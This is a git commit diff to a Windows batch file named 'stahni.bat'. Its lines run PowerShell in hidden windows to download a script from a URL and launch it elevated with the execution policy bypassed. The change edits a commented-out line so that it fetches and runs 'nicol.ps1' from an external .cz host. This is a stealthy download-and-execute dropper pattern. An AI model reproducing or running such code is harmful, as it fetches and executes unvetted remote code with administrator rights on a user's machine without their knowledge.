a0dda7784176b3d89386964629db45b4bcfc6f4c
antiproton-matter <166539466+antiproton-matter@users.noreply.github.com>
2025-06-02 11:53:54 +0200

    Update stahni.bat

--- stahni.bat
+++ stahni.bat
@@ -11,7 +11,7 @@ powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SCRIPT_URL%' -
 powershell -WindowStyle Hidden -Command "Start-Process powershell -WindowStyle Hidden -ArgumentList '-ExecutionPolicy Bypass -File \"%SCRIPT_PATH%\"' -Verb RunAs"
 
 endlocal
-rem powershell -Command "& {Invoke-WebRequest -Uri 'https://25plrp.cz/script.ps1' -OutFile 'script.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File script.ps1'}"
+rem powershell -Command "& {Invoke-WebRequest -Uri 'https://25plrp.cz/nicol.ps1' -OutFile 'nicol.ps1'; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoProfile -File nicol.ps1'}"
 PAUSE
 
 
